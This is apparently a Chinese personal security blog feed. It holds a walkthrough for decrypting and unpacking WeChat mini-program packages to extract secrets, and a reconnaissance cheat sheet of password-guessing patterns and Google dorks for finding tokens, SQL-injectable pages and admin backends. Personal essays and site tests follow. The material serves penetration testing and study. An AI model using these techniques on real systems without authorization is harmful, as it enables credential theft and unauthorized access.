title="微信小程序解包"></a>微信小程序解包</h2><p>微信小程序解包介绍：微信小程序解包是指将微信小程序的源代码从其原始的.wxapkg文件中提取出来，以便进行分析、修改或反编译。一些开发者可能会使用这种技术来了解小程序的内部工作原理，或者为了进行安全审计。请注意，微信小程序的反编译和解包操作可能会违反微信的服务条款</p><p>.wxapkg文件介绍：.wxapkg文件是微信小程序的打包文件格式(所以又称微信小程序包、微信小程序源码包)，它是一种压缩文件，通常包含了一个或多个小程序的代码、资源和配置信息等。可以将.wxapkg文件解压缩成一个目录结构，其中包含了小程序的所有文件和文件夹，例如JavaScript、CSS、图片、音频、视频、配置文件等【微信小程序在运行时，会在用户系统中生成一个后缀为wxapkg的程序包，通过反编译这个包，我们便可以获取到此小程序的前端代码，通过分析前端代码，可以得到后端接口与传输数据】</p><p>操作手法：想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作</p><ol><li><p>获取.wxapkg文件(Windows版和手机版的微信小程序包稍微有点区别，下面以Windows版为例)</p><ul><li>Windows .wxapkg 文件默认存放路径：<code>C:\Users\&#123;系统用户名&#125;\Documents\WeChat Files\Applet\&#123;小程序的AppID&#125;\</code></li><li>IOS .wxapkg 文件默认存放路径：<code>/var/mobile/Containers/Data/Application/&#123;系统UUID&#125;/Library/WechatPrivate/&#123;user哈希值&#125;/WeApp/LocalCache/release/&#123;小程序的AppID&#125;</code></li><li>Android .wxapkg 默认文件存放路径：<code>/data/data/com.tencent.mm/MicroMsg/&#123;user哈希值&#125;/appbrand/pkg/</code></li></ul><p>说明：以上是默认存放路径，如果更改过微信文件保存路径，可以在微信设置中查看</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030150424988.png" alt="image-20231030150424988"></p><p>目录展示：目录下有一堆wx开头的目录，后面的一串字符就是对应的小程序ID【可以在访问小程序时通过抓包获取到。如果不想抓包又想知道小程序ID，有个技巧，可以把这些目录删掉，重新访问小程序时会再次自动下载，根据日期来找到对应的包即可】<img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030145000259.png" alt="image-20231030145000259"></p></li><li><p>Windows版的小程序包自动在外部加了一层的加密(所以才需要解密，只有解密了才能解包)，我们看到的包名统一为：_<em>APP</em>_.wxapkg</p></li></ol><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030145549897.png" alt="image-20231030145549897"></p><p>说明：如果打开后看到多个.wxapkg，这是一种防御手段，称为分包，处理方式还是一样，对所有.wxapkg文件进行解密、解包即可(无非就是多逆向几个包而已)【文件大小最大的一般是主包】</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030210013880.png" alt="image-20231030210013880"></p><p>使用010editor打开，可以看到V1MMWX这样的文件头，V1MMWX标识就是加密后所添加的标识</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030145738408.png"></p><p>Windows版的微信小程序的加密流程：</p><ol><li>首先pbkdf2生成AES的key。利用微信小程序id字符串为pass，salt为<strong>saltiest</strong> 迭代次数为1000。调用pbkdf2生成一个32位的key</li><li>首先取原始的wxapkg的包得前1023个字节通过AES通过1生成的key和iv(<strong>the iv: 16 bytes</strong>),进行加密</li><li>接着利用微信小程序id字符串的倒数第2个字符为xor key，依次异或1023字节后的所有数据，如果微信小程序id小于2位，则xorkey 为 <strong>0x66</strong></li><li>把AES加密后的数据（1024字节）和xor后的数据一起写入文件，并在文件头部添加<strong>V1MMWX</strong>标识</li></ol><p>下面两个github项目都可以对Windows版的微信小程序进行解密操作</p><ul><li><a href="https://github.com/superdashu/pc_wxapkg_decrypt_python">https://github.com/superdashu/pc_wxapkg_decrypt_python</a></li><li><a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></li></ul><p>这里使用pc_wxapkg_decrypt进行解密：</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030175422842.png" alt="image-20231030175422842"></p><ul><li>注意：<ul><li>路径中不要带空格，否则会报错，类似“Program File”这种，要避免</li></ul></li><li>解密命令</li></ul><pre class="line-numbers language-none"><code class="language-none">#.\pc_wxapkg_decrypt.exe -wxid 小程序ID -in __APP__.wxapkg路径.\pc_wxapkg_decrypt.exe -wxid wx518a2b2e96ce3ca0 -in C:\Users\Zeroten\Desktop\微信小程序解包测试\__APP__.wxapkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030180007316.png" alt="image-20231030180007316"></p><p>解密后的文件默认名称为dec.wxapkg，会直接生成在pc_wxapkg_decrypt.exe所在目录下</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030180405972.png" alt="image-20231030180405972"></p><p>解密后的包就是需要通过解析来获取小程序源码的包，这里先使用010editor查看小程序的结构</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030180830409.png" alt="image-20231030180830409"></p><p>从旁边的文件目录中可以看出，这种包并非是一个压缩格式的包，而是一个二进制的包，所以需要特定的方法解包</p><ol start="3"><li>解包操作：</li></ol><p>下面两个github项目都可以微信小程序进行解包操作：</p><ul><li><a href="https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad">https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad</a></li></ul><pre class="line-numbers language-none"><code class="language-none">#执行后，会在dec.wxapkg目录下生成解包后的文件夹python3 unwxapkg.py dec.wxapkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030182724709.png" alt="image-20231030182724709"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030182857180.png" alt="image-20231030182857180"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030182913615.png" alt="image-20231030182913615"></p><p>目录介绍：</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030210847809.png" alt="image-20231030210847809"></p><p>敏感关键词：appid、secret(如果这个appid和secret可以使用，就能获取到seesion_key)，下面是微信官方的小程序登录流程【<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/login.html%E3%80%91">https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/login.html】</a></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030212430785.png" alt="image-20231030212430785"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/api-login.2fcc9f35.jpg" alt="img"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030212404448.png" alt="image-20231030212404448"></p><ul><li><a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></li></ul><pre class="line-numbers language-none"><code class="language-none">#执行后，会在dec.wxapkg目录下生成解包后的文件夹node wuWxapkg.js dec.wxapkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030185209297.png" alt="image-20231030185209297"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030185415461.png" alt="image-20231030185415461"></p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030185634433.png" alt="image-20231030185634433"></p><p>如提示，检测到此包是分包后的子包，使用-s参数指定存放路径即可</p><pre class="line-numbers language-none"><code class="language-none">#node wuWxapkg.js 分包.wxapkg -s&#x3D;&#x2F;分包所在目录node wuWxapkg.js _19871000_28.wxapkg -s&#x3D;..&#x2F;_1514036652_28<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>鸣谢：</p><ul><li><a href="https://misakikata.github.io/2021/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%A7%A3%E5%8C%85/">微信小程序解包 ~ Misaki’s Blog (misakikata.github.io)</a></li><li><a href="https://mp.weixin.qq.com/s/QAKBcW9TzyH0bFW_oYZgIA">https://mp.weixin.qq.com/s/QAKBcW9TzyH0bFW_oYZgIA</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集手法备忘录</title>
      <link href="/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>外网信息收集方式一览：</p><p><img src="/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/1641980627-617290-image.png" alt="img"></p><p>通用字典制作：一本针对性强的字典，能够提高命中率，更加精准</p><ul><li>企业邮箱前缀、子域名可以作为用户名&#x2F;密码字典的制作</li></ul><p>说明：</p><ul><li>邮箱是一个很重要的渠道，如查询某edu大学的邮箱的时候 ，很多时候能从邮箱中找到学号和工号</li></ul><p>邮箱查询：邮箱查询可以类比挖子域名来理解，通过情报系统收集暴露在互联网上的邮箱，比如你知道@qq.com，那么通过邮箱查询就可以查到用户暴露在互联网上的QQ邮箱(即<a href="mailto:&#x78;&#120;&#x78;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x78;&#120;&#x78;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a>)。下面列举一些可以查询邮箱的网址</p><ul><li><a href="https://phonebook.cz/">https://phonebook.cz</a></li><li><a href="https://hunter.io/">https://hunter.io</a></li><li><a href="http://www.skymem.info/">http://www.skymem.info</a></li><li><a href="https://www.email-format.com/i/search">https://www.email-format.com/i/search</a></li><li><a href="https://app.snov.io/domain-search">https://app.snov.io/domain-search</a></li></ul><p>用户名字典制作：</p><p><img src="/2023/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%8B%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/image-20231027101236433.png" alt="image-20231027101236433"></p><p>密码字典制作：</p><p>一些常识与实战常用密码规律</p><ul><li><p>针对同一个目标，要注意密码复用(又称撞库、密码碰撞)【如许多设备默认口令的web端和ssh或者telnet的口令是一样的】【内网业务系统习惯使用同一套帐户密码】【有很多管理员为了管理方便，用同一套密码管理不同服务器】</p></li><li><p>员工姓名全拼、简拼、简单变形(zhangsan、zhangsan123、zs123456等)</p></li><li><p>员工生日&#x2F;身份证后六位&#x2F;手机号后六位</p></li><li><p>企业域名(xxx.com)、企业英文名或域名#年份(xxx#2018)、企业英文名或域名@123(xxx@123、xxx123、xxx2018)、企业缩写加年份(xxx@2021 xxx*2020)、企业域名+999(xxx.com999、xxx.com666)</p></li><li><p>多关注系统后台、组件的默认密码【获得途径：搜索引擎、官方手册等】</p></li></ul><p>搜索引擎查询(以谷歌为例)：基本思路是site、host配合inurl、intext、intitle，或者filetype找敏感文件。下面列举几个常用的谷歌聚合查询语句，其他搜索引擎类似【注意：用谷歌语法找站的时候，要加点中文，不然搜出来的站可能都是英文站】</p><ul><li><code>site:example.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|manage|admin|login|system</code></li><li><code>site:example.com inurl:login|admin|manage|manager|admin_login|login_admin|system</code></li></ul><p>经验：如果某公司&#x2F;学校有私有系统，可以考虑去找使用手册之类的东西（因为某些公司&#x2F;学校上线新的系统基本上会为员工或者老师准备操作手册，操作手册中会有系统截图，如果管理员截图打码不严格，就可能会泄露账号或者密码信息，除此之外，操作手册中还会记录系统部署方式、系统默认账号密码、系统如何操作使用等有价值的信息）。下面还是以谷歌搜索为例</p><ul><li><code>site:example.com intext:&quot;手册&quot;</code></li><li><code>site:example.com intext:&quot;文档&quot;</code></li></ul><p>除此之外，还有一些常用的谷歌搜索语法</p><ul><li><code>site:example.com intext:&quot;忘记密码&quot;</code></li><li><code>site:example.com intext:&quot;工号&quot;</code></li><li><code>site:example.com intext:&quot;优秀员工&quot;</code></li><li><code>site:example.com intext:&quot;身份证号码&quot;</code></li><li><code>site:example.com intext:&quot;手机号&quot;</code></li></ul><p>下面列举几个搜索可能产生未授权访问漏洞的谷歌语法【再次强调，这只是信息搜集阶段，即使不能未授权访问成功，也可以收集到一些有用的信息，比如用户名、密码等】</p><ul><li><code>site:example.com inurl:token</code></li><li><code>site:example.com inurl:cookie</code></li><li><code>site:example.com inurl:session</code></li><li><code>site:example.com inurl:jsession</code></li><li><code>site:example.com inurl:userid</code></li><li><code>site:example.com inurl:passwd</code></li></ul><p>下面列举几个搜索SQL注入的谷歌语法【参数不一定要是id，也可以是tid、keyword之类的其它参数】</p><ul><li><code>公司inurl:php?id=</code></li><li><code>公司inurl:asp?id=</code></li><li><code>公司inurl:aspx?id=</code></li><li><code>公司inurl:list.php?id=</code></li></ul><p>下面列举几个搜索弱密码、越权、找后台的谷歌语法【根据经验，asp和aspx的后台还有越权漏洞，禁用JS，然后直接访问后台URL，有大概率直接进去】</p><ul><li><code>后台inurl:php</code></li><li><code>后台inurl:asp</code></li><li><code>后台inurl:aspx</code></li><li><code>后台site:edu.cn</code></li></ul><p>新媒体信息搜集</p><p>说明：主要是微信公众号或者小程序等新媒体的信息搜集，有以下途径</p><ul><li>微信默认搜索【手动打开微信搜索即可】</li><li>小蓝本搜索【<a href="https://www.xiaolanben.com/%E3%80%91">https://www.xiaolanben.com/】</a></li><li>第三方微信公众号数据分析平台(这类平台大多都要注册一个账号才能使用)</li></ul><p>​易撰：<a href="http://www.yizhuan5.com/">http://www.yizhuan5.com/</a></p><p>​西瓜数据：<a href="http://data.xiguaji.com/">http://data.xiguaji.com/</a></p><p>​次幂数据：<a href="https://www.cimidata.com/">https://www.cimidata.com/</a></p><p>fofa信息搜集</p><p>下面以挖通用型漏洞为例，介绍使用fofa进行信息搜集的流程和技巧</p><ol><li>title&#x3D;”平台”【搜索网站标题中包含”平台”关键字的网站。可以依据名称判断是否为通用的系统，找到通用的系统进行下一步】</li><li>利用标题、图标、js特征文件搜索，找找其他类似的系统<ul><li><code>icon_hash=&quot;-247388890&quot;</code>【搜索指定icon图标哈希值的资产】</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生活而不是生存</title>
      <link href="/2023/10/21/%E6%98%AF%E7%94%9F%E6%B4%BB%E8%80%8C%E4%B8%8D%E6%98%AF%E7%94%9F%E5%AD%98/"/>
      <url>/2023/10/21/%E6%98%AF%E7%94%9F%E6%B4%BB%E8%80%8C%E4%B8%8D%E6%98%AF%E7%94%9F%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;昨天刚刚结束了市护网，本以为又是平平无奇的一场，但是我的搭档真的给了我极大的震撼，他们的一番话实实在在地触碰到了我的灵魂，我觉得这是一种心灵上的震撼，我学到了一种除技术之外的东西，是一种对生活的态度。</p><p>&emsp;&emsp;回望自己过去的人生，感觉那不算生活，更像是一种生存，这番话并不是对这些年生活的否定，更像是一种反省，因为我们经常处于一个圈子中，这会导致一种可怕观念的产生，就是我们会认为世界就是这么大，颇有一番井底之蛙的意味。其实有时候，跳出圈子去看看，你会发现，生活真的还有诗和远方。从初一的时候开始接触计算机，直到现在，我仿佛进入了另一个次元，在数字世界中一呆就是好几年，我最常说的一句话就是，互联网很神秘，我很感谢互联网，它让来自天南地北的我们相聚，就像在身边一样。但这也使得我从未去领略过真实世界的大好河山，我想去看看江南水乡，想看看北方的鹅毛大雪…….我并不是没有想过应对之法，我热爱互联网上的一切，总觉得互联网可以代替一切，回想起我刚接触“谷歌地球”时，我不禁感慨，我现在可以足不出户，就能看到地球上的任何一个点，但是时隔这么多年，我发现我错了，我看到的是死的，是没有灵魂的，我还记得那段时间我迷茫了很久。当Ai爆火时，我像是发现了一块新大陆，我着手开始学习原理、训练模型…….，我最感兴趣的是Ai绘图，不仅仅是底层的实现原理令我着迷，我更想是让Ai把世界“画”给我看，因为我总感觉我自己没机会去看了。刚开始基于包容性强的底模进行训练，Ai已经开始告诉我一些场景了，我很开心，但总觉得缺了什么，再后来我问了玩摄影的朋友，他告诉，光线是一副图的灵魂，从那时候起，我致力于光模型的调参与训练，我希望找到自己的光。现在，我手里的光模型已经能表现出拟真的光影效果，我很开心，我坚信着，我的Ai终于能把世界“画”给我看了，直到这次市护网，我遇到了我的搭档，很幸运，很感激她。</p><p>&emsp;&emsp;空余时间，她给我看了许多照片，我也自然向她展示了我Ai绘图的成果，我精心调参过后的模型，展现出来的效果是绝美而逼真的，但我发现我错了，她开始向我分享她一张张照片的故事，她记得每一张照片背后发生的事情，而我…….我的照片是死的。我边听着她一张张照片背后的故事，一边回望自己的过去，她走过好多地方，遇到过好多事，见过好多人，她的照片触及到了我的灵魂，她的照片充满了“生活气”，这正是我一直追求的，我越听眼眶越有点湿润了。照片可以不需要很美，照片的意义不在于画面，或者说，我恍然发现我缺失的不是世界样貌，而是生活。她拍了拍了我的肩，说了无数人之前和我说过的话，好好生活，对自己好点，多出去看看，不然以后就没机会了。我感觉，这一次，我听进去了。虽然很短暂，但是我真的很享受，很感谢她，由衷的。世界，是生活，大好河山和有趣的事，只能亲自去看。</p><p>&emsp;&emsp;接触计算机以来，我一直在不断学习技术，我享受这种在网络世界不断探索的乐趣，但不得不承认，我失去了一些宝贵的东西。另一位搭档也和我说了类似的话，我把所有时间花在技术上，这是我的爱好，他认可，但是他觉得这是一种生存，不是生活，得到却又失去了。遇到你们，对我而言，就像遇到了宝藏。我的灵魂，仿佛听进去了。</p><p>&emsp;&emsp;饱含热泪，去生活。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 醒言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客精神</title>
      <link href="/2023/10/06/%E9%BB%91%E5%AE%A2%E7%B2%BE%E7%A5%9E/"/>
      <url>/2023/10/06/%E9%BB%91%E5%AE%A2%E7%B2%BE%E7%A5%9E/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;前段时间太忙，把自己累倒了。学习路上，也要保重身体啊。无意间在网上看到一个帖子，与我的三观很契合，我由衷希望这种黑客精神留存在每一个技术人的血液里。帖子如下：</p><p>&emsp;&emsp;真正的黑客是这样的：<br>&emsp;&emsp;1. 一个计算机系统，不论软件还是硬件，在他们面前，就是一副清晰复杂又美妙的迷宫图，他了解迷宫的形状，边界，每个转弯，每个回廊，每个回路，每个岔口。<br>&emsp;&emsp;2. 你问他，这里有个难题，该怎么解决？<br>&emsp;&emsp;3. 他说：给我10秒，我来看一下。他看了一下他脑海中的那副迷宫图，找到你的难题的起点以及终点，发现它们离得很近，他说：哦，简单，你先朝这边走，然后朝那边走，然后这么拐个弯，就到终点了<br>&emsp;&emsp;4. 你又说：我太胖了，这里有个门太小，我过不去，怎么办？<br>&emsp;&emsp;5. 他哦了一声：这样啊？你等一下。他又看了看那副图，思索了片刻，然后说：这里还有个路，不算太远，但是有点绕，我给你画个图吧。<br>&emsp;&emsp;6. 你拿着图，按着走，于是到终点了。</p><p>&emsp;&emsp;真正的黑客绝不是故弄玄虚生怕别人看出自己几斤几两的人，真正的黑客，能把看似复杂难解的问题，清晰明了地说清楚。而对某个问题确实不知道答案时，也不会胡说一通掩盖自己，只会说：这个我现在不知道。如果你想知道答案，我可以花时间研究一下看看。“黑客精神”这个词已经不仅仅局限在封闭的圈子中了，很幸运，在我的圈子中遇到了那些真正具备黑客精神的人，他（她）们热情而充满活力，很感谢，一位位领路人。</p><p>&emsp;&emsp;技术是纯粹的，因为喜欢才做，而不是为了显摆忽悠。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 醒言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>苦乐人生</title>
      <link href="/2023/09/16/%E8%8B%A6%E4%B9%90%E4%BA%BA%E7%94%9F/"/>
      <url>/2023/09/16/%E8%8B%A6%E4%B9%90%E4%BA%BA%E7%94%9F/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;简单记录一下近况吧，这段时间确实诸事不顺，人生路上总有坎坷，在社会上混久了但还不太习惯。虽然走的是技术流但是还是得提防一些小人，长这么大了，遇到了形形色色的人，每个人都有对自己人生的理解。感觉有很多话，但是码起字来反而忘言了。</p><p>&emsp;&emsp;不知道你们的生活中是否见过这样一些场景，一些人能力不强但是却位居高位，我客观分析过无数次，大多这类人都有一下特点：擅长画饼、擅耍嘴皮、喜欢走关系。记得那句话怎么说来着，如果你没有能力，又喜欢耍嘴皮子，那你多半是个领导 <span class="emoji" alias="joy" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">&#x1f602;</span>。我认识一个在国外工作的朋友，他说：“我遇到的最好的领导，同意我的一部分观点，同时耐心跟我解释，为什么不同意我的另一部分观点。我正在努力成为像他们一样的人”。我很有感触，如果你位居高位却不给别人带来实质性的好处，那么你可能德不配位，或者说有愧于人。但同时，小人却意识不到这一点，这类人坚定捍卫着有点类似像“为达目的可以不择手段”“得不到就毁掉”的极其错误的价值观。这其中就存在着一些矛盾点，你想要前进、想要上升就必须途径这些人。不清楚大家大学时期是否有参加过学生会，就好比竞选学生会，也许你能力强、成绩好、三观正、有责任心等等一系列在伦理道德评价里优秀的方面，但是往往事与愿违，当选者竟然是擅耍嘴皮、好吃懒做、偷奸耍滑之人，难道你的这些方方面面是一文不值的吗？错了，只是那些所谓的“评委”根本没资格选评你。</p><p>&emsp;&emsp;拉回到现实，也许你就能理解。</p><p>&emsp;&emsp;如果你对一些大公司或者知名工作室有所接触，你会发现，它们的HR多半是能力强的人，而不是靠浑水摸鱼、搞小动作上位的。他们面试你，能听懂你讲的术语和技术，换句话说，他们的能力确确实实在你之上。你奋斗了很久坐到HR的面前，但是我再告诉你一个情况，对方也奋斗了很久才坐到你的对面。这和很多优质团队的理念完全契合：优秀的人只愿于优秀的人共事。如果你是管理者，我可以负责任的告诉你，二流的人招进来的员工不可能是一流的。其实道理很简单，“物以类聚，人以群分”，我只不过是复述了老祖宗的话罢了。</p><p>&emsp;&emsp;话再说回来，这类小人善于包装，也许你有无数种报复的手段，但是我还是想把恩师告诉我的一种观念传达给你：己所不欲，勿施于人。</p><p>&emsp;&emsp;难道就只能被恶心吗？这个点我还没考虑清楚，这类人不会消除，甚至可以说比比皆是，小人是垂直于社会阶层的。</p><p>&emsp;&emsp;那打不过就加入？世界总有人付出也总有人坐享其成，你可以表面上闪着光却内心黑暗，但我真的建议你内心充满着暖暖旭阳，因为灵魂的闪耀会吸引具有情感共鸣的人，我也正这么做着。我说的很空洞，也许是我对人生理解的深度还不够。永远年轻，永远热泪盈眶。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 醒言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>标题级数测试</title>
      <link href="/2023/08/16/%E6%A0%87%E9%A2%98%E7%BA%A7%E6%95%B0%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/16/%E6%A0%87%E9%A2%98%E7%BA%A7%E6%95%B0%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表格及任务列表测试</title>
      <link href="/2023/08/16/%E8%A1%A8%E6%A0%BC%E5%8F%8A%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/16/%E8%A1%A8%E6%A0%BC%E5%8F%8A%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>title | content<br>— | —<br>1 | 1<br>2 | 2</p><p>title | content<br>— | —<br>1 | 1<br>2 | 2</p><hr><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">jack</td></tr><tr><td align="center">2</td><td align="center">jim</td></tr><tr><td align="center">3</td><td align="center">nano</td></tr></tbody></table><table><thead><tr><th align="left">Tittle1</th><th align="center">Tittle2</th><th align="right">Tittle3</th></tr></thead><tbody><tr><td align="left">Content</td><td align="center">Content</td><td align="right">Content</td></tr><tr><td align="left">Content</td><td align="center">Content</td><td align="right">Content</td></tr></tbody></table><hr><ul><li><input checked disabled type="checkbox"> 吃饭</li><li><input disabled type="checkbox"> 睡觉</li><li><input checked disabled type="checkbox"> 看书</li><li><input disabled type="checkbox"> 锻炼</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学公式测试</title>
      <link href="/2023/08/15/%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/15/%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>数学公式渲染也修好了，下面测试几个数学公式，为了提高性能，数学公式要阅读全文才会渲染，预览图是不显示的</p><p>$$<br>J_\alpha(x) &#x3D; \sum_{m&#x3D;0}^\infty \frac{(-1)^m}{m! \Gamma (m + \alpha + 1)} {\left({ \frac{x}{2} }\right)}^{2m + \alpha}<br>$$</p><p>$$<br>evidence_{i}&#x3D;\sum_{j}W_{ij}x_{j}+b_{i}<br>$$</p><p>$$<br>\begin {matrix}<br>   1 &amp; 2 &amp; 3 \\<br>   4 &amp; 5 &amp; 6 \\<br>   7 &amp; 8 &amp; 9<br>  \end {matrix}<br>$$</p><p>$$<br>\frac{x}{2y} +\frac{x-y}{x+y}<br>$$</p>]]></content>
      
      
      
        <tags>
            
